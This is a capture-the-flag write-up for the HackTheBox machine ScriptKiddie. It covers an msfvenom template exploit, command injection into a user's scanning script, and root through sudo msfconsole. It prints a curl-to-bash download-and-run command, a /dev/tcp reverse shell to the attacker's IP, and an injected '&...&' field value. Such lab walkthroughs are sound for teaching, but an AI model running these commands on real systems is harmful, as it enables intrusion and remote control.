---
title: ScriptKiddie Writeup [HTB]
tags: [HackTheBox, Command Injection]
image: /assets/images/scriptkiddie/scriptkiddie.png
published: true
banner: true
---

ScriptKiddie is a Linux based machine that was active since February 6th of 2021 to June 5th, on this machine we will take advantage of an old version of metasploit exposed through a webpage to get command execution on the machine, then we will see that we can perform command injection on a script that is ran for another user in the machine, finally this user can run msfconsole as root which allows us to run any command, so we can get a shell as root.

# [](#header-1)Enumeration

We start using masscan to find all the available ports and then use nmap to get more information about them.

```
masscan -e tun0 --rate=500 -p 0-65535 10.10.10.226
nmap -sC -sV -p 22,5000, -Pn -o scan.txt 10.10.10.226

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There is only two ports open, ssh and a webpage hosted on python on port 5000, let's check it.

![](/assets/images/scriptkiddie/website.png)

# [](#header-1)Gaining Access

The webpage looks like a page that allows to use some common hacking tools through it, so we could guess that there is some kind of command injection, but after testing for a while there is no luck, checking better the site, we see that we can create payloads for windows, linux and android with msfvenom using a file as template, there is a vulnerability on an old version of msfvenom that would allows us to get command injection on generating an apk using an specially crafted template file, searchploit gives us a [link](https://www.exploit-db.com/exploits/49491) to an exploit for it.
We download the exploit, and change the payload for `curl 10.10.14.205:8000/shell.sh | bash`, shell.sh is a file that contains the command for a bash reverse shell. When we run the file, the apk evil.apk, is created inside a directory in /tmp, we start a nc listener and a python http server, then we upload evil.apk as template file, and generate an apk payload, after some seconds we will get a request to our http server and then we will receive a shell to the target machine. With that we can read user.txt.

![](/assets/images/scriptkiddie/shell1.png)

# [](#header-1)Lateral Movement

Looking around the machine we see that there is another user, pwn, inside his home directory there is a file called "scanlosers.sh", which contains the next code:

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

We see that it reads the file "hackers" inside /home/kid/logs, use cut to parse every line accoring spaces, grabs the third field, and (assuming that that field contains an ip) runs nmap agains it, if we check hackers file we see that it is empty, and if we put anything inside, the file gets emptied again. I generated an ssh key locally, `ssh-keygen -C kid@htb.com`, and put the public key inside /home/kid/.ssh/authorized_keys, now I can connect through ssh, then I uploaded pspy to see what is happening when I put something inside hackers file.
Now we can see that when antything is put inside hackers file, scanloosed.sh is fired up and the nmap scan is performed.

![](/assets/images/scriptkiddie/pspy.png)

We can perform a command injection on this file, first we create a file called .rev, with the next content:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.205/54322 0>&1
```

We put it inside /home/kid, /tmp is different for every user, so we can't use it, then we set execution permissions on it, `chmod +x .rev`, finally we write on hackers, `&/home/kid/.rev&`, we saw that whatever we put there is reflected on the nmap command, so there is no need to play with the spaces of cut, with that we get a shell as pwn.

![](/assets/images/scriptkiddie/shell2.png)

# [](#header-1)Privilege Escalation

We check if we can run anything with sudo.

![](/assets/images/scriptkiddie/sudo.png)

We see that we can run msfconsole, msfconsole isn't actually much different from an actual shell, we can move along directories, cat files and other stuff, but if we want to get a shell we just have to create a file similiar the the one that we made in the last step, give it execution permissions, and execute it when we are inside msfconsole.

![](/assets/images/scriptkiddie/execute.png)

And with that we get a shell as root, and we have finished with the machine.

![](/assets/images/scriptkiddie/root.png)